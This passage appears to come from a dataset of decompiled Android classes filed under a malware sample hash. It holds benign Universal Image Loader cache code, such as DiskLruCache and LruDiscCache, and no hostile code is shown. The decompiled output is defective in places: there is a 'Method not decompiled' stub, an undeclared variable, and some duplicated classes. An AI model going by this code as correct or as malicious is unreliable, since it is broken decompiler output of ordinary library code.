        return;         }       }     }  catch (    Throwable th) {       Util.closeQuietly(reader);       throw th;     }   }   private void readJournalLine(  String line) throws IOException {     String key;     int firstSpace=line.indexOf(32);     if (firstSpace == -1) {       throw new IOException(""unexpected journal line: "" + line);     }     int keyBegin=firstSpace + 1;     int secondSpace=line.indexOf(32,keyBegin);     if (secondSpace == -1) {       key=line.substring(keyBegin);       if (firstSpace == REMOVE.length() && line.startsWith(REMOVE)) {         this.lruEntries.remove(key);         return;       }     }  else {       key=line.substring(keyBegin,secondSpace);     }     Entry entry=this.lruEntries.get(key);     if (entry == null) {       entry=new Entry(key);       this.lruEntries.put(key,entry);     }     if (secondSpace != -1 && firstSpace == CLEAN.length() && line.startsWith(CLEAN)) {       String[] parts=line.substring(secondSpace + 1).split("" "");       entry.readable=true;       entry.currentEditor=null;       entry.setLengths(parts);       return;     }     if (secondSpace != -1 || firstSpace != DIRTY.length() || !line.startsWith(DIRTY)) {       if (secondSpace != -1 || firstSpace != READ.length() || !line.startsWith(READ)) {         throw new IOException(""unexpected journal line: "" + line);       }       return;     }     entry.currentEditor=new Editor(entry);   }   private void processJournal() throws IOException {     deleteIfExists(this.journalFileTmp);     Iterator<Entry> i=this.lruEntries.values().iterator();     while (i.hasNext()) {       Entry entry=i.next();       if (entry.currentEditor == null) {         for (int t=0; t < this.valueCount; t++) {           this.size+=entry.lengths[t];           this.fileCount++;         }       }  else {         entry.currentEditor=null;         for (int t2=0; t2 < this.valueCount; t2++) {           deleteIfExists(entry.getCleanFile(t2));           deleteIfExists(entry.getDirtyFile(t2));         }         i.remove();       }     }   }   public synchronized void rebuildJournal() throws IOException {     if (this.journalWriter != null) {       this.journalWriter.close();     }     Writer writer=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(this.journalFileTmp),Util.US_ASCII));     try {       writer.write(MAGIC);       writer.write(""\n"");       writer.write(VERSION_1);       writer.write(""\n"");       writer.write(Integer.toString(this.appVersion));       writer.write(""\n"");       writer.write(Integer.toString(this.valueCount));       writer.write(""\n"");       writer.write(""\n"");       for (      Entry entry : this.lruEntries.values()) {         if (entry.currentEditor != null) {           writer.write(""DIRTY "" + entry.key + '\n');         }  else {           writer.write(""CLEAN "" + entry.key + entry.getLengths()+ '\n');         }       }       writer.close();       if (this.journalFile.exists()) {         renameTo(this.journalFile,this.journalFileBackup,true);       }       renameTo(this.journalFileTmp,this.journalFile,false);       this.journalFileBackup.delete();       this.journalWriter=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(this.journalFile,true),Util.US_ASCII));     }  catch (    Throwable th) {       writer.close();       throw th;     }   }   private static void deleteIfExists(  File file) throws IOException {     if (file.exists() && !file.delete()) {       throw new IOException();     }   }   private static void renameTo(  File from,  File to,  boolean deleteDestination) throws IOException {     if (deleteDestination) {       deleteIfExists(to);     }     if (!from.renameTo(to)) {       throw new IOException();     }   }   public synchronized Snapshot get(  String key) throws IOException {     Snapshot snapshot=null; synchronized (this) {       checkNotClosed();       validateKey(key);       Entry entry=this.lruEntries.get(key);       if (entry != null && entry.readable) {         File[] files=new File[this.valueCount];         InputStream[] ins=new InputStream[this.valueCount];         for (int i=0; i < this.valueCount; i++) {           try {             File file=entry.getCleanFile(i);             files[i]=file;             ins[i]=new FileInputStream(file);           }  catch (          FileNotFoundException e) {             for (int i2=0; i2 < this.valueCount && ins[i2] != null; i2++) {               Util.closeQuietly(ins[i2]);             }           }         }         this.redundantOpCount++;         this.journalWriter.append((CharSequence)(""READ "" + key + '\n'));         if (journalRebuildRequired()) {           this.executorService.submit(this.cleanupCallable);         }         snapshot=new Snapshot(key,entry.sequenceNumber,files,ins,entry.lengths);       }     }     return snapshot;   }   public Editor edit(  String key) throws IOException {     return edit(key,ANY_SEQUENCE_NUMBER);   }   public synchronized com.nostra13.universalimageloader.cache.disc.impl.ext.DiskLruCache.Editor edit(  java.lang.String r6,  long r7) throws java.io.IOException {     throw new UnsupportedOperationException(""Method not decompiled: com.nostra13.universalimageloader.cache.disc.impl.ext.DiskLruCache.edit(java.lang.String, long):com.nostra13.universalimageloader.cache.disc.impl.ext.DiskLruCache$Editor"");   }   public File getDirectory(){     return this.directory;   }   public synchronized long getMaxSize(){     return this.maxSize;   }   public synchronized int getMaxFileCount(){     return this.maxFileCount;   }   public synchronized void setMaxSize(  long maxSize){     this.maxSize=maxSize;     this.executorService.submit(this.cleanupCallable);   }   public synchronized long size(){     return this.size;   }   public synchronized long fileCount(){     return this.fileCount;   }   public synchronized void completeEdit(  Editor editor,  boolean success) throws IOException {     Entry entry=editor.entry;     if (entry.currentEditor != editor) {       throw new IllegalStateException();     }     if (success && !entry.readable) {       for (int i=0; i < this.valueCount; i++) {         if (!editor.written[i]) {           editor.abort();           throw new IllegalStateException(""Newly created entry didn't create value for index "" + i);         }         if (!entry.getDirtyFile(i).exists()) {           editor.abort();           break;         }       }     }     for (int i2=0; i2 < this.valueCount; i2++) {       File dirty=entry.getDirtyFile(i2);       if (success) {         if (dirty.exists()) {           File clean=entry.getCleanFile(i2);           dirty.renameTo(clean);           long oldLength=entry.lengths[i2];           long newLength=clean.length();           entry.lengths[i2]=newLength;           this.size=(this.size - oldLength) + newLength;           this.fileCount++;         }       }  else {         deleteIfExists(dirty);       }     }     this.redundantOpCount++;     entry.currentEditor=null;     if (entry.readable | success) {       entry.readable=true;       this.journalWriter.write(""CLEAN "" + entry.key + entry.getLengths()+ '\n');       if (success) {         long j=this.nextSequenceNumber;         this.nextSequenceNumber=1 + j;         entry.sequenceNumber=j;       }     }  else {       this.lruEntries.remove(entry.key);       this.journalWriter.write(""REMOVE "" + entry.key + '\n');     }     this.journalWriter.flush();     if (this.size > this.maxSize || this.fileCount > this.maxFileCount || journalRebuildRequired()) {       this.executorService.submit(this.cleanupCallable);     }   }   public boolean journalRebuildRequired(){     return this.redundantOpCount >= 2000 && this.redundantOpCount >= this.lruEntries.size();   }   public synchronized boolean remove(  String key) throws IOException {     boolean z;     checkNotClosed();     validateKey(key);     Entry entry=this.lruEntries.get(key);     if (entry == null || entry.currentEditor != null) {       z=false;     }  else {       for (int i=0; i < this.valueCount; i++) {         File file=entry.getCleanFile(i);         if (file.exists() && !file.delete()) {           throw new IOException(""failed to delete "" + file);         }         this.size-=entry.lengths[i];         this.fileCount--;         entry.lengths[i]=0;       }       this.redundantOpCount++;       this.journalWriter.append((CharSequence)(""REMOVE "" + key + '\n'));       this.lruEntries.remove(key);       if (journalRebuildRequired()) {         this.executorService.submit(this.cleanupCallable);       }       z=true;     }     return z;   }   public synchronized boolean isClosed(){     return this.journalWriter == null;   }   private void checkNotClosed(){     if (this.journalWriter == null) {       throw new IllegalStateException(""cache is closed"");     }   }   public synchronized void flush() throws IOException {     checkNotClosed();     trimToSize();     trimToFileCount();     this.journalWriter.flush();   }   @Override public synchronized void close() throws IOException {     if (this.journalWriter != null) {       Iterator i$=new ArrayList(this.lruEntries.values()).iterator();       while (i$.hasNext()) {         Entry entry=(Entry)i$.next();         if (entry.currentEditor != null) {           entry.currentEditor.abort();         }       }       trimToSize();       trimToFileCount();       this.journalWriter.close();       this.journalWriter=null;     }   }   public void trimToSize() throws IOException {     while (this.size > this.maxSize) {       Map.Entry<String,Entry> toEvict=this.lruEntries.entrySet().iterator().next();       remove(toEvict.getKey());     }   }   public void trimToFileCount() throws IOException {     while (this.fileCount > this.maxFileCount) {       Map.Entry<String,Entry> toEvict=this.lruEntries.entrySet().iterator().next();       remove(toEvict.getKey());     }   }   public void delete() throws IOException {     close();     Util.deleteContents(this.directory);   }   private void validateKey(  String key){     Matcher matcher=LEGAL_KEY_PATTERN.matcher(key);     if (!matcher.matches()) {       throw new IllegalArgumentException(""keys must match regex [a-z0-9_-]{1,64}: \"""" + key + ""\"""");     }   }   public static String inputStreamToString(  InputStream in) throws IOException {     return Util.readFully(new InputStreamReader(in,Util.UTF_8));   } public final class Snapshot implements Closeable {     private File[] files;     private final InputStream[] ins;     private final String key;     private final long[] lengths;     private final long sequenceNumber;     private Snapshot(    String key,    long sequenceNumber,    File[] files,    InputStream[] ins,    long[] lengths){       this.key=key;       this.sequenceNumber=sequenceNumber;       this.files=files;       this.ins=ins;       this.lengths=lengths;     }     public Editor edit() throws IOException {       return DiskLruCache.this.edit(this.key,this.sequenceNumber);     }     public File getFile(    int index){       return this.files[index];     }     public InputStream getInputStream(    int index){       return this.ins[index];     }     public String getString(    int index) throws IOException {       return DiskLruCache.inputStreamToString(getInputStream(index));     }     public long getLength(    int index){       return this.lengths[index];     }     @Override public void close(){       InputStream[] arr$=this.ins;       for (      InputStream in : arr$) {         Util.closeQuietly(in);       }     }   } public final class Editor {     private boolean committed;     private final Entry entry;     private boolean hasErrors;     private final boolean[] written;     private Editor(    Entry entry){       this.entry=entry;       this.written=entry.readable ? null : new boolean[DiskLruCache.this.valueCount];     }     public InputStream newInputStream(    int index) throws IOException { synchronized (DiskLruCache.this) {         if (this.entry.currentEditor != this) {           throw new IllegalStateException();         }         if (!this.entry.readable) {           return null;         }         try {           return new FileInputStream(this.entry.getCleanFile(index));         }  catch (        FileNotFoundException e) {           return null;         }       }     }     public String getString(    int index) throws IOException {       InputStream in=newInputStream(index);       if (in != null) {         return DiskLruCache.inputStreamToString(in);       }       return null;     }     public OutputStream newOutputStream(    int index) throws IOException {       OutputStream outputStream;       FileOutputStream outputStream2; synchronized (DiskLruCache.this) {         if (this.entry.currentEditor != this) {           throw new IllegalStateException();         }         if (!this.entry.readable) {           this.written[index]=true;         }         File dirtyFile=this.entry.getDirtyFile(index);         try {           outputStream2=new FileOutputStream(dirtyFile);         }  catch (        FileNotFoundException e) {           DiskLruCache.this.directory.mkdirs();           try {             outputStream2=new FileOutputStream(dirtyFile);           }  catch (          FileNotFoundException e2) {             outputStream=DiskLruCache.NULL_OUTPUT_STREAM;           }         }         outputStream=new FaultHidingOutputStream(outputStream2);       }       return outputStream;     }     public void set(    int index,    String value) throws IOException {       Writer writer;       Writer writer2=null;       try {         writer=new OutputStreamWriter(newOutputStream(index),Util.UTF_8);       }  catch (      Throwable th) {         th=th;       }       try {         writer.write(value);         Util.closeQuietly(writer);       }  catch (      Throwable th2) {         th=th2;         writer2=writer;         Util.closeQuietly(writer2);         throw th;       }     }     public void commit() throws IOException {       if (this.hasErrors) {         DiskLruCache.this.completeEdit(this,false);         DiskLruCache.this.remove(this.entry.key);       }  else {         DiskLruCache.this.completeEdit(this,true);       }       this.committed=true;     }     public void abort() throws IOException {       DiskLruCache.this.completeEdit(this,false);     }     public void abortUnlessCommitted(){       if (!this.committed) {         try {           abort();         }  catch (        IOException e) {         }       }     } public class FaultHidingOutputStream extends FilterOutputStream {       private FaultHidingOutputStream(      OutputStream out){         super(out);       }       @Override public void write(      int oneByte){         try {           this.out.write(oneByte);         }  catch (        IOException e) {           Editor.this.hasErrors=true;         }       }       @Override public void write(      byte[] buffer,      int offset,      int length){         try {           this.out.write(buffer,offset,length);         }  catch (        IOException e) {           Editor.this.hasErrors=true;         }       }       @Override public void close(){         try {           this.out.close();         }  catch (        IOException e) {           Editor.this.hasErrors=true;         }       }       @Override public void flush(){         try {           this.out.flush();         }  catch (        IOException e) {           Editor.this.hasErrors=true;         }       }     }   } public final class Entry {     private Editor currentEditor;     private final String key;     private final long[] lengths;     private boolean readable;     private long sequenceNumber;     private Entry(    String key){       this.key=key;       this.lengths=new long[DiskLruCache.this.valueCount];     }     public String getLengths() throws IOException {       StringBuilder result=new StringBuilder();       long[] arr$=this.lengths;       for (      long size : arr$) {         result.append(' ').append(size);       }       return result.toString();     }     public void setLengths(    String[] strings) throws IOException {       if (strings.length != DiskLruCache.this.valueCount) {         throw invalidLengths(strings);       }       for (int i=0; i < strings.length; i++) {         try {           this.lengths[i]=Long.parseLong(strings[i]);         }  catch (        NumberFormatException e) {           throw invalidLengths(strings);         }       }     }     private IOException invalidLengths(    String[] strings) throws IOException {       throw new IOException(""unexpected journal line: "" + Arrays.toString(strings));     }     public File getCleanFile(    int i){       return new File(DiskLruCache.this.directory,this.key + ""."" + i);     }     public File getDirtyFile(    int i){       return new File(DiskLruCache.this.directory,this.key + ""."" + i+ "".tmp"");     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.disc.impl.ext\Editor.code","public final class Editor {   private boolean committed;   private final Entry entry;   private boolean hasErrors;   private final boolean[] written;   private Editor(  Entry entry){     this.entry=entry;     this.written=entry.readable ? null : new boolean[DiskLruCache.this.valueCount];   }   public InputStream newInputStream(  int index) throws IOException { synchronized (DiskLruCache.this) {       if (this.entry.currentEditor != this) {         throw new IllegalStateException();       }       if (!this.entry.readable) {         return null;       }       try {         return new FileInputStream(this.entry.getCleanFile(index));       }  catch (      FileNotFoundException e) {         return null;       }     }   }   public String getString(  int index) throws IOException {     InputStream in=newInputStream(index);     if (in != null) {       return DiskLruCache.inputStreamToString(in);     }     return null;   }   public OutputStream newOutputStream(  int index) throws IOException {     OutputStream outputStream;     FileOutputStream outputStream2; synchronized (DiskLruCache.this) {       if (this.entry.currentEditor != this) {         throw new IllegalStateException();       }       if (!this.entry.readable) {         this.written[index]=true;       }       File dirtyFile=this.entry.getDirtyFile(index);       try {         outputStream2=new FileOutputStream(dirtyFile);       }  catch (      FileNotFoundException e) {         DiskLruCache.this.directory.mkdirs();         try {           outputStream2=new FileOutputStream(dirtyFile);         }  catch (        FileNotFoundException e2) {           outputStream=DiskLruCache.NULL_OUTPUT_STREAM;         }       }       outputStream=new FaultHidingOutputStream(outputStream2);     }     return outputStream;   }   public void set(  int index,  String value) throws IOException {     Writer writer;     Writer writer2=null;     try {       writer=new OutputStreamWriter(newOutputStream(index),Util.UTF_8);     }  catch (    Throwable th) {       th=th;     }     try {       writer.write(value);       Util.closeQuietly(writer);     }  catch (    Throwable th2) {       th=th2;       writer2=writer;       Util.closeQuietly(writer2);       throw th;     }   }   public void commit() throws IOException {     if (this.hasErrors) {       DiskLruCache.this.completeEdit(this,false);       DiskLruCache.this.remove(this.entry.key);     }  else {       DiskLruCache.this.completeEdit(this,true);     }     this.committed=true;   }   public void abort() throws IOException {     DiskLruCache.this.completeEdit(this,false);   }   public void abortUnlessCommitted(){     if (!this.committed) {       try {         abort();       }  catch (      IOException e) {       }     }   } public class FaultHidingOutputStream extends FilterOutputStream {     private FaultHidingOutputStream(    OutputStream out){       super(out);     }     @Override public void write(    int oneByte){       try {         this.out.write(oneByte);       }  catch (      IOException e) {         Editor.this.hasErrors=true;       }     }     @Override public void write(    byte[] buffer,    int offset,    int length){       try {         this.out.write(buffer,offset,length);       }  catch (      IOException e) {         Editor.this.hasErrors=true;       }     }     @Override public void close(){       try {         this.out.close();       }  catch (      IOException e) {         Editor.this.hasErrors=true;       }     }     @Override public void flush(){       try {         this.out.flush();       }  catch (      IOException e) {         Editor.this.hasErrors=true;       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.disc.impl.ext\Entry.code","public final class Entry {   private Editor currentEditor;   private final String key;   private final long[] lengths;   private boolean readable;   private long sequenceNumber;   private Entry(  String key){     this.key=key;     this.lengths=new long[DiskLruCache.this.valueCount];   }   public String getLengths() throws IOException {     StringBuilder result=new StringBuilder();     long[] arr$=this.lengths;     for (    long size : arr$) {       result.append(' ').append(size);     }     return result.toString();   }   public void setLengths(  String[] strings) throws IOException {     if (strings.length != DiskLruCache.this.valueCount) {       throw invalidLengths(strings);     }     for (int i=0; i < strings.length; i++) {       try {         this.lengths[i]=Long.parseLong(strings[i]);       }  catch (      NumberFormatException e) {         throw invalidLengths(strings);       }     }   }   private IOException invalidLengths(  String[] strings) throws IOException {     throw new IOException(""unexpected journal line: "" + Arrays.toString(strings));   }   public File getCleanFile(  int i){     return new File(DiskLruCache.this.directory,this.key + ""."" + i);   }   public File getDirtyFile(  int i){     return new File(DiskLruCache.this.directory,this.key + ""."" + i+ "".tmp"");   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.disc.impl.ext\FaultHidingOutputStream.code","public class FaultHidingOutputStream extends FilterOutputStream {   private FaultHidingOutputStream(  OutputStream out){     super(out);   }   @Override public void write(  int oneByte){     try {       this.out.write(oneByte);     }  catch (    IOException e) {       Editor.this.hasErrors=true;     }   }   @Override public void write(  byte[] buffer,  int offset,  int length){     try {       this.out.write(buffer,offset,length);     }  catch (    IOException e) {       Editor.this.hasErrors=true;     }   }   @Override public void close(){     try {       this.out.close();     }  catch (    IOException e) {       Editor.this.hasErrors=true;     }   }   @Override public void flush(){     try {       this.out.flush();     }  catch (    IOException e) {       Editor.this.hasErrors=true;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.disc.impl.ext\LruDiscCache.code","public class LruDiscCache implements DiskCache {   public static final int DEFAULT_BUFFER_SIZE=32768;   public static final Bitmap.CompressFormat DEFAULT_COMPRESS_FORMAT=Bitmap.CompressFormat.PNG;   public static final int DEFAULT_COMPRESS_QUALITY=100;   private static final String ERROR_ARG_NEGATIVE="" argument must be positive number"";   private static final String ERROR_ARG_NULL="" argument must be not null"";   protected int bufferSize;   protected DiskLruCache cache;   protected Bitmap.CompressFormat compressFormat;   protected int compressQuality;   protected final FileNameGenerator fileNameGenerator;   private File reserveCacheDir;   public LruDiscCache(  File cacheDir,  FileNameGenerator fileNameGenerator,  long cacheMaxSize) throws IOException {     this(cacheDir,null,fileNameGenerator,cacheMaxSize,0);   }   public LruDiscCache(  File cacheDir,  File reserveCacheDir,  FileNameGenerator fileNameGenerator,  long cacheMaxSize,  int cacheMaxFileCount) throws IOException {     this.bufferSize=32768;     this.compressFormat=DEFAULT_COMPRESS_FORMAT;     this.compressQuality=100;     if (cacheDir == null) {       throw new IllegalArgumentException(""cacheDir argument must be not null"");     }     if (cacheMaxSize < 0) {       throw new IllegalArgumentException(""cacheMaxSize argument must be positive number"");     }     if (cacheMaxFileCount < 0) {       throw new IllegalArgumentException(""cacheMaxFileCount argument must be positive number"");     }     if (fileNameGenerator == null) {       throw new IllegalArgumentException(""fileNameGenerator argument must be not null"");     }     cacheMaxSize=cacheMaxSize == 0 ? Long.MAX_VALUE : cacheMaxSize;     cacheMaxFileCount=cacheMaxFileCount == 0 ? Integer.MAX_VALUE : cacheMaxFileCount;     this.reserveCacheDir=reserveCacheDir;     this.fileNameGenerator=fileNameGenerator;     initCache(cacheDir,reserveCacheDir,cacheMaxSize,cacheMaxFileCount);   }   private void initCache(  File cacheDir,  File reserveCacheDir,  long cacheMaxSize,  int cacheMaxFileCount) throws IOException {     try {       this.cache=DiskLruCache.open(cacheDir,1,1,cacheMaxSize,cacheMaxFileCount);     }  catch (    IOException e) {       L.e(e);       if (reserveCacheDir != null) {         initCache(reserveCacheDir,null,cacheMaxSize,cacheMaxFileCount);       }       if (this.cache == null) {         throw e;       }     }   }   @Override public File getDirectory(){     return this.cache.getDirectory();   }   @Override public File get(  String imageUri){     DiskLruCache.Snapshot snapshot=null;     try {       try {         snapshot=this.cache.get(getKey(imageUri));         r2=snapshot != null ? snapshot.getFile(0) : null;       }  catch (      IOException e) {         L.e(e);         if (snapshot != null) {           snapshot.close();         }       }       return r2;     }   finally {       if (snapshot != null) {         snapshot.close();       }     }   }   @Override public boolean save(  String imageUri,  InputStream imageStream,  IoUtils.CopyListener listener) throws IOException {     boolean copied=false;     DiskLruCache.Editor editor=this.cache.edit(getKey(imageUri));     if (editor != null) {       OutputStream os=new BufferedOutputStream(editor.newOutputStream(0),this.bufferSize);       try {         copied=IoUtils.copyStream(imageStream,os,listener,this.bufferSize);         IoUtils.closeSilently(os);         if (copied) {           editor.commit();         }  else {           editor.abort();         }       }  catch (      Throwable th) {         IoUtils.closeSilently(os);         if (0 != 0) {           editor.commit();         }  else {           editor.abort();         }         throw th;       }     }     return copied;   }   @Override public boolean save(  String imageUri,  Bitmap bitmap) throws IOException {     boolean savedSuccessfully=false;     DiskLruCache.Editor editor=this.cache.edit(getKey(imageUri));     if (editor != null) {       OutputStream os=new BufferedOutputStream(editor.newOutputStream(0),this.bufferSize);       try {         savedSuccessfully=bitmap.compress(this.compressFormat,this.compressQuality,os);         if (savedSuccessfully) {           editor.commit();         }  else {           editor.abort();         }       }   finally {         IoUtils.closeSilently(os);       }     }     return savedSuccessfully;   }   @Override public boolean remove(  String imageUri){     try {       return this.cache.remove(getKey(imageUri));     }  catch (    IOException e) {       L.e(e);       return false;     }   }   @Override public void close(){     try {       this.cache.close();     }  catch (    IOException e) {       L.e(e);     }     this.cache=null;   }   @Override public void clear(){     try {       this.cache.delete();     }  catch (    IOException e) {       L.e(e);     }     try {       initCache(this.cache.getDirectory(),this.reserveCacheDir,this.cache.getMaxSize(),this.cache.getMaxFileCount());     }  catch (    IOException e2) {       L.e(e2);     }   }   private String getKey(  String imageUri){     return this.fileNameGenerator.generate(imageUri);   }   public void setBufferSize(  int bufferSize){     this.bufferSize=bufferSize;   }   public void setCompressFormat(  Bitmap.CompressFormat compressFormat){     this.compressFormat=compressFormat;   }   public void setCompressQuality(  int compressQuality){     this.compressQuality=compressQuality;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.disc.impl.ext\Snapshot.code","public final class Snapshot implements Closeable {   private File[] files;   private final InputStream[] ins;   private final String key;   private final long[] lengths;   private final long sequenceNumber;   private Snapshot(  String key,  long sequenceNumber,  File[] files,  InputStream[] ins,  long[] lengths){     this.key=key;     this.sequenceNumber=sequenceNumber;     this.files=files;     this.ins=ins;     this.lengths=lengths;   }   public Editor edit() throws IOException {     return DiskLruCache.this.edit(this.key,this.sequenceNumber);   }   public File getFile(  int index){     return this.files[index];   }   public InputStream getInputStream(  int index){     return this.ins[index];   }   public String getString(  int index) throws IOException {     return DiskLruCache.inputStreamToString(getInputStream(index));   }   public long getLength(  int index){     return this.lengths[index];   }   @Override public void close(){     InputStream[] arr$=this.ins;     for (    InputStream in : arr$) {       Util.closeQuietly(in);     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.disc.impl.ext\StrictLineReader.code","class StrictLineReader implements Closeable {   private static final byte CR=13;   private static final byte LF=10;   private byte[] buf;   private final Charset charset;   private int end;   private final InputStream in;   private int pos;   public StrictLineReader(  InputStream in,  Charset charset){     this(in,8192,charset);   }   public StrictLineReader(  InputStream in,  int capacity,  Charset charset){     if (in == null || charset == null) {       throw new NullPointerException();     }     if (capacity < 0) {       throw new IllegalArgumentException(""capacity <= 0"");     }     if (!charset.equals(Util.US_ASCII)) {       throw new IllegalArgumentException(""Unsupported encoding"");     }     this.in=in;     this.charset=charset;     this.buf=new byte[capacity];   }   @Override public void close() throws IOException { synchronized (this.in) {       if (this.buf != null) {         this.buf=null;         this.in.close();       }     }   }   public String readLine() throws IOException {     int i;     String res; synchronized (this.in) {       if (this.buf == null) {         throw new IOException(""LineReader is closed"");       }       if (this.pos >= this.end) {         fillBuf();       }       int i2=this.pos;       while (true) {         if (i2 != this.end) {           if (this.buf[i2] != 10) {             i2++;           }  else {             int lineEnd=(i2 == this.pos || this.buf[i2 + (-1)] != 13) ? i2 : i2 - 1;             res=new String(this.buf,this.pos,lineEnd - this.pos,this.charset.name());             this.pos=i2 + 1;           }         }  else {           ByteArrayOutputStream out=new ByteArrayOutputStream((this.end - this.pos) + 80){             @Override public String toString(){               int length=(this.count <= 0 || this.buf[this.count + (-1)] != 13) ? this.count : this.count - 1;               try {                 return new String(this.buf,0,length,StrictLineReader.this.charset.name());               }  catch (              UnsupportedEncodingException e) {                 throw new AssertionError(e);               }             }           } ;           loop1:           while (true) {             out.write(this.buf,this.pos,this.end - this.pos);             this.end=-1;             fillBuf();             i=this.pos;             while (i != this.end) {               if (this.buf[i] == 10) {                 break loop1;               }               i++;             }           }           if (i != this.pos) {             out.write(this.buf,this.pos,i - this.pos);           }           this.pos=i + 1;           res=out.toString();         }       }       return res;     }   }   private void fillBuf() throws IOException {     int result=this.in.read(this.buf,0,this.buf.length);     if (result == -1) {       throw new EOFException();     }     this.pos=0;     this.end=result;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.disc.impl.ext\Util.code","final class Util {   static final Charset US_ASCII=Charset.forName(""US-ASCII"");   static final Charset UTF_8=Charset.forName(AsyncHttpResponseHandler.DEFAULT_CHARSET);   private Util(){   }   public static String readFully(  Reader reader) throws IOException {     try {       StringWriter writer=new StringWriter();       char[] buffer=new char[1024];       while (true) {         int count=reader.read(buffer);         if (count != -1) {           writer.write(buffer,0,count);         }  else {           return writer.toString();         }       }     }   finally {       reader.close();     }   }   public static void deleteContents(  File dir) throws IOException {     File[] files=dir.listFiles();     if (files == null) {       throw new IOException(""not a readable directory: "" + dir);     }     for (    File file : files) {       if (file.isDirectory()) {         deleteContents(file);       }       if (!file.delete()) {         throw new IOException(""failed to delete file: "" + file);       }     }   }   public static void closeQuietly(  Closeable closeable){     if (closeable != null) {       try {         closeable.close();       }  catch (      RuntimeException rethrown) {         throw rethrown;       } catch (      Exception e) {       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.disc.naming\FileNameGenerator.code","public interface FileNameGenerator {   String generate(  String str); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.disc.naming\HashCodeFileNameGenerator.code","public class HashCodeFileNameGenerator implements FileNameGenerator {   @Override public String generate(  String imageUri){     return String.valueOf(imageUri.hashCode());   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.disc.naming\Md5FileNameGenerator.code","public class Md5FileNameGenerator implements FileNameGenerator {   private static final String HASH_ALGORITHM=""MD5"";   private static final int RADIX=36;   @Override public String generate(  String imageUri){     byte[] md5=getMD5(imageUri.getBytes());     BigInteger bi=new BigInteger(md5).abs();     return bi.toString(RADIX);   }   private byte[] getMD5(  byte[] data){     try {       MessageDigest digest=MessageDigest.getInstance(HASH_ALGORITHM);       digest.update(data);       byte[] hash=digest.digest();       return hash;     }  catch (    NoSuchAlgorithmException e) {       L.e(e);       return null;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.memory\BaseMemoryCache.code","public abstract class BaseMemoryCache implements MemoryCache {   private final Map<String,Reference<Bitmap>> softMap=Collections.synchronizedMap(new HashMap());   protected abstract Reference<Bitmap> createReference(  Bitmap bitmap);   @Override public Bitmap get(  String key){     Reference<Bitmap> reference=this.softMap.get(key);     if (reference == null) {       return null;     }     Bitmap result=reference.get();     return result;   }   @Override public boolean put(  String key,  Bitmap value){     this.softMap.put(key,createReference(value));     return true;   }   @Override public Bitmap remove(  String key){     Reference<Bitmap> bmpRef=this.softMap.remove(key);     if (bmpRef == null) {       return null;     }     return bmpRef.get();   }   @Override public Collection<String> keys(){     HashSet hashSet; synchronized (this.softMap) {       hashSet=new HashSet(this.softMap.keySet());     }     return hashSet;   }   @Override public void clear(){     this.softMap.clear();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.memory\LimitedMemoryCache.code","public abstract class LimitedMemoryCache extends BaseMemoryCache {   private static final int MAX_NORMAL_CACHE_SIZE=16777216;   private static final int MAX_NORMAL_CACHE_SIZE_IN_MB=16;   private final int sizeLimit;   private final List<Bitmap> hardCache=Collections.synchronizedList(new LinkedList());   private final AtomicInteger cacheSize=new AtomicInteger();   protected abstract int getSize(  Bitmap bitmap);   protected abstract Bitmap removeNext();   public LimitedMemoryCache(  int sizeLimit){     this.sizeLimit=sizeLimit;     if (sizeLimit > 16777216) {       L.w(""You set too large memory cache size (more than %1$d Mb)"",16);     }   }   @Override public boolean put(  String key,  Bitmap value){     boolean putSuccessfully=false;     int valueSize=getSize(value);     int sizeLimit=getSizeLimit();     int curCacheSize=this.cacheSize.get();     if (valueSize < sizeLimit) {       while (curCacheSize + valueSize > sizeLimit) {         Bitmap removedValue=removeNext();         if (this.hardCache.remove(removedValue)) {           curCacheSize=this.cacheSize.addAndGet(-getSize(removedValue));         }       }       this.hardCache.add(value);       this.cacheSize.addAndGet(valueSize);       putSuccessfully=true;     }     super.put(key,value);     return putSuccessfully;   }   @Override public Bitmap remove(  String key){     Bitmap value=super.get(key);     if (value != null && this.hardCache.remove(value)) {       this.cacheSize.addAndGet(-getSize(value));     }     return super.remove(key);   }   @Override public void clear(){     this.hardCache.clear();     this.cacheSize.set(0);     super.clear();   }   protected int getSizeLimit(){     return this.sizeLimit;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.cache.memory\MemoryCache.code","public interface MemoryCache extends MemoryCacheAware<String,Bitmap> { } "
